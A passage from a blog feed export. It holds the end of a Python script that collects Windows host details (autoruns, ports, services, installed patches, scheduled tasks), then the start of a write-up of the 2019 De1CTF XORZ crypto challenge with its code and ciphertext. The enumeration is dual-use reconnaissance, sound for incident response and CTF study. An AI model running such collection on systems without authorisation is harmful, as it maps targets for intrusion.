print(&quot;Path: &#123;&#125;&quot;.format(value))</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;&#123;&#125; is empty.\n&quot;.format(title))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= 安装应用 =========================&quot;</span>)</span><br><span class="line">    <span class="comment"># 列出 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 下的子项及其 DisplayName 值</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="keyword">if</span> subkeys1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKLM:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印结果</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> subkeys2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= 自启动项 =========================&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= 开放端口 =========================&quot;</span>)</span><br><span class="line">    services_TCP_found = []  <span class="comment"># 保存识别出的端口服务信息</span></span><br><span class="line">    services_TCP_unfound = []</span><br><span class="line">    services_UDP_found = []</span><br><span class="line">    services_UDP_unfound = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.Popen([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用正则表达式匹配并提取信息</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                local_address, _, state, pid = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 只输出 LISTENING 状态的信息，并且只显示本地地址、状态和 PID</span></span><br><span class="line">                <span class="keyword">if</span> state <span class="keyword">in</span> [<span class="string">&quot;LISTENING&quot;</span>, <span class="string">&quot;ESTABLISHED&quot;</span>]:</span><br><span class="line">                    <span class="comment"># 从 local_address 中提取 IP 地址和端口</span></span><br><span class="line">                    ip_port_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\S+):(\d+)&#x27;</span>, local_address)</span><br><span class="line">                    <span class="keyword">if</span> ip_port_match:</span><br><span class="line">                        ip, port = ip_port_match.groups()</span><br><span class="line">                        <span class="comment"># 尝试从字典中获取服务信息，如果没有找到则输出 &quot;Unknown Service&quot;</span></span><br><span class="line">                        service = service_port_mapping.get(<span class="built_in">int</span>(port), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                        <span class="comment"># 输出 IP地址、端口、状态和 PID、服务</span></span><br><span class="line">                        <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                            services_TCP_found.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                            <span class="comment"># services_TCP_found.append(&#123;&quot;port&quot;: port, &quot;pid&quot;:pid,&quot;service&quot;: service&#125;)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            services_TCP_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                            <span class="comment"># services_TCP_unfound.append(&#123;&quot;port&quot;: port, &quot;pid&quot;:pid, &quot;service&quot;: service&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 本地连接IP 端口去重  并用port进行排序</span></span><br><span class="line">        services_TCP_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_TCP_found&#125;]</span><br><span class="line">        services_TCP_found = <span class="built_in">sorted</span>(services_TCP_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_TCP_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_TCP_unfound&#125;]</span><br><span class="line">        services_TCP_unfound = <span class="built_in">sorted</span>(services_TCP_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个已知TCP端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_TCP_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个未知TCP端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_TCP_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 识别出的TCP端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_TCP_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_TCP_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>] ,service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line">                <span class="comment"># print(&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;/&#123;&#125;&quot;.format(service_info[&#x27;port&#x27;], service_info[&#x27;pid&#x27;],service_info[&#x27;service&#x27;]))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 未识别出的TCP端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_TCP_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_TCP_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line">                <span class="comment"># print(&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;/&#123;&#125;&quot;.format(service_info[&#x27;port&#x27;], service_info[&#x27;pid&#x27;],service_info[&#x27;service&#x27;]))</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果未找到相关信息，则输出一条消息</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line) <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到相关TCP端口服务!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            UDPpattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;UDP\s+(?P&lt;ip_address&gt;[\w\.\[\]:]+):(?P&lt;port&gt;\d+)\s+\*:\*\s+(?P&lt;pid&gt;\d+)&#x27;</span>)</span><br><span class="line">            UDPmatches = UDPpattern.findall(line)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> UDPmatch <span class="keyword">in</span> UDPmatches:</span><br><span class="line">                service = service_port_mapping.get(<span class="built_in">int</span>(UDPmatch[<span class="number">1</span>]), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                <span class="comment"># print(&quot;UDP:&quot;, UDPmatch[0], &quot;Port:&quot;, UDPmatch[1], &quot;PID:&quot;, UDPmatch[2])</span></span><br><span class="line">                <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                    services_UDP_found.append(&#123;<span class="string">&quot;port&quot;</span>: UDPmatch[<span class="number">1</span>], <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    services_UDP_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: UDPmatch[<span class="number">1</span>], <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line"></span><br><span class="line">        services_UDP_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_UDP_found&#125;]</span><br><span class="line">        services_UDP_found = <span class="built_in">sorted</span>(services_UDP_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_UDP_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_UDP_unfound&#125;]</span><br><span class="line">        services_UDP_unfound = <span class="built_in">sorted</span>(services_UDP_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个已知UDP端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_UDP_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个未知UDP端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_UDP_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 识别出的UDP端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_UDP_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_UDP_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;UDP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 未识别出的UDP端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_UDP_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_UDP_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;UDP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;========================= 运行服务 =========================&#x27;</span>)</span><br><span class="line">        result = subprocess.Popen(<span class="string">&#x27;net start | find /v &quot;已经启动以下 Windows 服务&quot; | find /v &quot;命令成功完成&quot;&#x27;</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># 去空行</span></span><br><span class="line">        netstat_output = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line">        <span class="comment"># 去掉每行前面的几个空格</span></span><br><span class="line">        cleaned_text = <span class="string">&quot;\n&quot;</span>.join(line.lstrip() <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines())</span><br><span class="line">        <span class="built_in">print</span>(cleaned_text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= 系统信息 =========================&quot;</span>)</span><br><span class="line">    cmd_command1 = <span class="string">r&#x27;systeminfo | findstr /i /c:&quot;主机名&quot; /c:&quot;OS 名称&quot; /c:&quot;OS 版本&quot; | find /v &quot;BIOS 版本&quot;&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command1, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout1, stderr1 = process.communicate()</span><br><span class="line">    stdout1 = stdout1.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    stdout1 = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> stdout1.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(stdout1)</span><br><span class="line">    <span class="keyword">if</span> stderr1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr1.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    cmd_command2 = <span class="string">r&#x27;cmd /c ipconfig | findstr /i &quot;IPv4 地址 IP Address&quot; | findstr /i /v &quot;IPv6&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    process = subprocess.Popen(cmd_command2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    stdout2, stderr2 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr2.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式匹配IPv4地址</span></span><br><span class="line">    ipv4_pattern1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IPv4 地址[^:]+:\s*([\d.]+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line">    ipv4_pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IP Address\. .+? : (\d+\.\d+\.\d+\.\d+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">    match1 = ipv4_pattern1.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">    match2 = ipv4_pattern2.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> match1:</span><br><span class="line">        ipv4_address = match1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4地址:\t &quot;</span>, ipv4_address)</span><br><span class="line">    <span class="keyword">elif</span> match2:</span><br><span class="line">        ipv4_address = match2.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4地址:\t &quot;</span>, ipv4_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到IPv4地址&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd_command3 = <span class="string">&#x27;systeminfo&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    stdout3, stderr3 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr3:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    kb_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;KB\d&#123;7&#125;&#x27;</span>)</span><br><span class="line">    q_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Q\d&#123;6&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    matches_kb = kb_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    matches_q = q_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches_kb:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已安装&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_kb)) + <span class="string">&quot;个补丁:\t&quot;</span>, matches_kb)</span><br><span class="line">    <span class="keyword">if</span> matches_q:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已安装&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_q)) + <span class="string">&quot;个补丁:\t&quot;</span>, matches_q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取返回码</span></span><br><span class="line">    return_code = process.returncode</span><br><span class="line">    <span class="keyword">if</span> return_code != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Return Code:&quot;</span>, return_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="comment"># 指定目录路径</span></span><br><span class="line">    directory = <span class="string">r&#x27;C:\Windows\System32\Tasks&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= 计划任务 =========================&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 获取目录下的文件列表</span></span><br><span class="line">        file_list = os.listdir(directory)</span><br><span class="line">        <span class="keyword">if</span> file_list:</span><br><span class="line">            <span class="comment"># 初始化一个空数组用于存储文件名</span></span><br><span class="line">            files_array = []</span><br><span class="line">            <span class="comment"># 遍历目录下的内容</span></span><br><span class="line">            <span class="keyword">for</span> filename <span class="keyword">in</span> file_list:</span><br><span class="line">                file_path = os.path.join(directory, filename)</span><br><span class="line">                <span class="comment"># 检查当前项目是否为文件</span></span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">                    <span class="comment"># 如果是文件，则将其名称添加到数组中</span></span><br><span class="line">                    files_array.append(filename)</span><br><span class="line">            <span class="comment"># 打印存储在数组中的文件名</span></span><br><span class="line">            <span class="keyword">if</span> files_array:</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files_array:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(file))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到计划任务!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="comment"># 处理找不到目录的情况</span></span><br><span class="line">        <span class="comment"># print(&quot;[-] 目录 &#x27;&#123;&#125;&#x27; 不存在&quot;.format(directory))</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到计划任务!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOSRelease</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 开始对本机进行信息收集,请稍等片刻......&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 检测到当前主机系统为&#x27;</span>,platform.system() +<span class="string">&quot; &quot;</span>+platform.release())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getOSRelease()</span><br><span class="line">    getSystemInfo()</span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    getServiceInfo()</span><br><span class="line">    getScheduleTaskInfo()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>2019 De1CTF XORZ</title>
    <url>/posts/8eb1c662/</url>
    <content><![CDATA[<h3 id="汉明距离【Hamming-distance】"><a href="#汉明距离【Hamming-distance】" class="headerlink" title="汉明距离【Hamming distance】"></a>汉明距离【Hamming distance】</h3><p>在信息论中，两个等长字符串之间的汉明距离 是两个字符串对应位置的不同字符的个数。</p>
<p>简单来说 汉明距离度量了通过替换字符的方式将字符串x变成y所需要的最小的替换次数。</p>
<p>比如</p>
<p>1011101与1001001 之间的汉明距离是2。</p>
<blockquote>
<p>1011101 </p>
<p>1001001</p>
</blockquote>
<p>2143896与2233796之间的汉明距离是3。</p>
<blockquote>
<p>2143896</p>
<p>2233796</p>
</blockquote>
<p>“toned”与”roses”之间的汉明距离是3。</p>
<blockquote>
<p>toned</p>
<p>roses</p>
</blockquote>
<p>快速求解汉明距离的方法 就是 将等长字符串 进行异或。两个二进制字符异或后计算值为1的 比特位格式 就是最后的汉明距离。</p>
<h3 id="2019-De1CTF-XORZ"><a href="#2019-De1CTF-XORZ" class="headerlink" title="2019 De1CTF XORZ"></a>2019 De1CTF XORZ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"> </span><br><span class="line">key=flag.strip(<span class="string">&quot;de1ctf&#123;&quot;</span>).strip(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">&quot;WeAreDe1taTeam&quot;</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(p) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(ki)) ^ <span class="built_in">ord</span>(<span class="built_in">next</span>(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="built_in">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>



<h4 id="去盐"><a href="#去盐" class="headerlink" title="去盐"></a>去盐</h4><p>key 38个十六进制数  30个未知字符</p>
<p>c = p ^ ki ^ si</p>
<p>已知ci </p>
